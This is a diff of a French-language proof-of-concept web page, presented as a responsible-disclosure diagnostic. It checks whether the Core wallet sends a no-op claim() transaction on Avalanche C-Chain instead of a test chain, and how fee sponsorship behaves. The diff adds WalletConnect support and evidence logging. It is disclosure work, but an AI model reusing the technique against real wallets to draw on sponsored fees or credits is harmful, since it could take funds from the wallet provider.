@@ -30,12 +30,13 @@
 <p class="warn">
   ⚠️ <strong>Diagnostic à but de divulgation responsable.</strong>
   <strong>UNE SEULE tentative</strong> par chargement de page (le bouton se verrouille).
-  Ne répétez pas l'opération et <strong>ne déplacez pas</strong> les fonds éventuellement crédités :
-  collectez les preuves, puis contactez la sécurité d'Ava Labs.
+  Ne répétez pas l'opération et <strong>ne déplacez pas</strong> les fonds éventuellement
+  crédités : collectez les preuves, puis contactez la sécurité d'Ava Labs.
 </p>
 
 <div class="row">
-  <button id="connect">1. Connecter le wallet</button>
+  <button id="connect-injected">1a. Connecter (wallet injecté / desktop)</button>
+  <button id="connect-wc">1b. Connecter (WalletConnect / mobile)</button>
   <button id="refresh" disabled>2. Rafraîchir (chaîne + soldes)</button>
   <button id="claim" disabled>3. Claim (une seule fois)</button>
   <button id="export" disabled>Exporter les preuves (JSON)</button>
@@ -54,16 +55,22 @@
 /* ============================================================================
    CONFIGURATION
    ----------------------------------------------------------------------------
-   - CLAIM_CONTRACT : adresse du contrat ClaimPoc DÉPLOYÉ SUR PINGALA (99999).
-     (Le contrat ne fait rien : il sert uniquement de cible à la transaction.)
-   - RPC C-Chain et Pingala : utilisés pour lire les soldes et les reçus de façon
-     INDÉPENDANTE du réseau actif du wallet (preuve objective).
+   - CLAIM_CONTRACT : contrat ClaimPoc DÉPLOYÉ SUR PINGALA (99999).
+   - WC_PROJECT_ID  : projectId Reown/WalletConnect (public). Pour un tunnel,
+                      ajoute l'URL du tunnel dans « Allowed origins » du projet.
+   - chains: Pingala (99999) comme la dApp ; optionalChains: C-Chain (43114)
+     pour reproduire le cas « Core reste sur C-Chain ».
    ============================================================================ */
 const CLAIM_CONTRACT = '0x21996AB1511Ddc4Cede2876D9CB27370997790Ff'; // ClaimPoc déployé sur Pingala (no-op)
 const CLAIM_SELECTOR = '0x4e71d92d'; // claim()
+const PINGALA_CHAIN_ID = 99999;
+const C_CHAIN_ID = 43114;
 const PINGALA_RPC = 'https://31.187.72.98.sslip.io/ext/bc/2bU2988XvYbG4z85k39QxhDNomHWREnTKzYWLViU1RMCeSwEea/rpc';
 const C_RPC = 'https://api.avax.network/ext/bc/C/rpc';
+const WC_PROJECT_ID = 'e46cab0b26fb49b6375fd488d2dc5e95'; // public (remplace par ton projet Reown si besoin)
 
+let provider = null;      // provider EIP-1193 actif (injecté OU WalletConnect)
+let wcProvider = null;
 let account = null;
 let attempted = false;
 const evidence = [];
@@ -116,8 +123,8 @@ function line(step, chain, walletBal, cBal, pBal, details) {
 
 /* ------------------------------- snapshot --------------------------------- */
 async function snapshot() {
-  const chainHex = await window.ethereum.request({ method: 'eth_chainId' });
-  const balHex = await window.ethereum.request({ method: 'eth_getBalance', params: [account, 'latest'] });
+  const chainHex = await provider.request({ method: 'eth_chainId' });
+  const balHex = await provider.request({ method: 'eth_getBalance', params: [account, 'latest'] });
   const chainId = BigInt(chainHex).toString();
   const wallet = { wei: BigInt(balHex).toString(), human: fmt18(balHex) };
   const [c, p] = await Promise.all([
@@ -132,6 +139,7 @@ async function refresh() {
   const s = await snapshot();
   el('state').textContent =
     'Wallet : ' + account + '\n' +
+    'Connexion : ' + (wcProvider ? 'WalletConnect' : 'injecté') + '\n' +
     'Chaîne active (wallet) : ' + chainLabel(s.chainId) + '\n' +
     'Solde natif wallet : ' + s.wallet.human + (s.chainId === '43114' ? ' AVAX' : ' (natif)') + '\n' +
     'Solde C-Chain (RPC) : ' + s.c.human + ' AVAX\n' +
@@ -145,7 +153,7 @@ async function refresh() {
 async function waitReceipt(hash, timeoutMs) {
   const start = Date.now();
   while (Date.now() - start < timeoutMs) {
-    const r = await window.ethereum.request({ method: 'eth_getTransactionReceipt', params: [hash] }).catch(() => null);
+    const r = await provider.request({ method: 'eth_getTransactionReceipt', params: [hash] }).catch(() => null);
     if (r) return r;
     await new Promise(res => setTimeout(res, 2000));
   }
@@ -153,7 +161,7 @@ async function waitReceipt(hash, timeoutMs) {
 }
 
 async function claimOnce() {
-  if (!account) return;
+  if (!account || !provider) return;
   if (attempted) { el('state').textContent = 'Une seule tentative autorisée par chargement.'; return; }
   if (CLAIM_CONTRACT === '0x0000000000000000000000000000000000000000') {
     alert('Renseigne CLAIM_CONTRACT dans index.html avec l\'adresse du contrat déployé sur Pingala.');
@@ -170,19 +178,18 @@ async function claimOnce() {
     /* IMPORTANT : on N'appelle PAS wallet_switchEthereumChain.
        Le but est d'observer si Core bascule (ou non) et comment il traite les
        frais (sponsorship) quand la transaction part sur la mauvaise chaîne. */
-    const txHash = await window.ethereum.request({
+    const txHash = await provider.request({
       method: 'eth_sendTransaction',
       params: [{ from: account, to: CLAIM_CONTRACT, data: CLAIM_SELECTOR, value: '0x0' }]
     });
     line('TX envoyée', '—', '—', '—', '—', txHash);
     evidence.push({ step: 'tx_sent', t: new Date().toISOString(), txHash });
 
-    const receipt = await waitReceipt(txHash, 180000);
+    const receipt = await waitReceipt(txHash, 240000);
     const after = await snapshot();
     line('APRÈS', chainLabel(after.chainId), after.wallet.human, after.c.human + ' AVAX', after.p.human + ' TST', after.t);
     evidence.push({ step: 'after', ...after });
 
-    // Sur quelle chaîne la tx a-t-elle réellement été minée ? (indépendant du wallet)
     const [cRec, pRec] = await Promise.all([rpcReceipt(C_RPC, txHash), rpcReceipt(PINGALA_RPC, txHash)]);
     const minedOn = cRec ? 'Avalanche C-Chain (43114)' : (pRec ? 'Pingala Chain (99999)' : 'introuvable');
     const rec = cRec || pRec;
@@ -193,30 +200,25 @@ async function claimOnce() {
     const deltaC = (before.c.wei !== '?' && after.c.wei !== '?') ? fmt18(BigInt(after.c.wei) - BigInt(before.c.wei)) : '?';
 
     const analysis = {
-      step: 'analysis',
-      t: new Date().toISOString(),
-      txHash,
-      chainBefore: before.chainId,
-      chainAfter: after.chainId,
-      minedOn,
+      step: 'analysis', t: new Date().toISOString(), txHash,
+      connection: wcProvider ? 'walletconnect' : 'injected',
+      chainBefore: before.chainId, chainAfter: after.chainId, minedOn,
       receiptStatus: rec ? rec.status : null,
       gasUsed: rec ? BigInt(rec.gasUsed).toString() : null,
-      feeNative: fee,
-      deltaCChain: deltaC,
+      feeNative: fee, deltaCChain: deltaC,
       deltaWallet: fmt18(BigInt(after.wallet.wei) - BigInt(before.wallet.wei)),
     };
     evidence.push(analysis);
 
-    line('RÉSULTAT',
-      'minée sur ' + minedOn,
+    line('RÉSULTAT', 'minée sur ' + minedOn,
       'Δ wallet ' + analysis.deltaWallet,
-      'Δ C-Chain ' + deltaC + ' AVAX',
-      '—',
+      'Δ C-Chain ' + deltaC + ' AVAX', '—',
       'status=' + analysis.receiptStatus + ' · frais=' + (fee || '?') + ' · chaîne avant/après=' + before.chainId + '/' + after.chainId);
 
     el('export').disabled = false;
     el('state').textContent =
       'Analyse :\n' +
+      '- Connexion     : ' + analysis.connection + '\n' +
       '- Chaîne AVANT  : ' + chainLabel(before.chainId) + '\n' +
       '- Chaîne APRÈS  : ' + chainLabel(after.chainId) + '\n' +
       '- Tx minée sur  : ' + minedOn + ' (status ' + analysis.receiptStatus + ')\n' +
@@ -242,19 +244,49 @@ function exportEvidence() {
   URL.revokeObjectURL(a.href);
 }
 
-/* ------------------------------- wiring ----------------------------------- */
-el('connect').addEventListener('click', async () => {
-  if (!window.ethereum) { alert('Aucun provider EIP-1193 détecté (ouvre cette page avec Core/MetaMask).'); return; }
+/* ------------------------------- connexions ------------------------------- */
+async function connectInjected() {
+  if (!window.ethereum) { alert('Aucun provider injecté (utilise WalletConnect sur mobile).'); return; }
+  provider = window.ethereum;
+  const accounts = await provider.request({ method: 'eth_requestAccounts' });
+  account = accounts[0];
+  el('refresh').disabled = false; el('claim').disabled = false;
+  await refresh();
+}
+
+async function connectWalletConnect() {
   try {
-    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-    account = accounts[0];
-    el('refresh').disabled = false;
-    el('claim').disabled = false;
+    if (!wcProvider) {
+      const mod = await import('https://esm.sh/@walletconnect/ethereum-provider@2.17.2');
+      const EthereumProvider = mod.EthereumProvider || mod.default;
+      wcProvider = await EthereumProvider.init({
+        projectId: WC_PROJECT_ID,
+        chains: [PINGALA_CHAIN_ID],
+        optionalChains: [C_CHAIN_ID],
+        rpcMap: { [PINGALA_CHAIN_ID]: PINGALA_RPC, [C_CHAIN_ID]: C_RPC },
+        showQrModal: true,
+        qrModalOptions: { themeMode: 'dark' },
+        metadata: {
+          name: 'Core Claim Sponsorship PoC',
+          description: 'PoC divulgation responsable',
+          url: location.origin,
+          icons: []
+        }
+      });
+    }
+    await wcProvider.connect();
+    provider = wcProvider;
+    account = (wcProvider.accounts && wcProvider.accounts[0]) || (await provider.request({ method: 'eth_accounts' }))[0];
+    el('refresh').disabled = false; el('claim').disabled = false;
     await refresh();
   } catch (e) {
-    el('state').textContent = 'Connexion refusée/échouée : ' + (e?.message || e);
+    el('state').textContent = 'WalletConnect échoué : ' + (e?.message || e);
   }
-});
+}
+
+/* ------------------------------- wiring ----------------------------------- */
+el('connect-injected').addEventListener('click', () => connectInjected().catch(e => { el('state').textContent = 'Erreur : ' + (e?.message || e); }));
+el('connect-wc').addEventListener('click', connectWalletConnect);
 el('refresh').addEventListener('click', () => refresh().catch(e => { el('state').textContent = 'Erreur : ' + (e?.message || e); }));
 el('claim').addEventListener('click', claimOnce);
 el('export').addEventListener('click', exportEvidence);
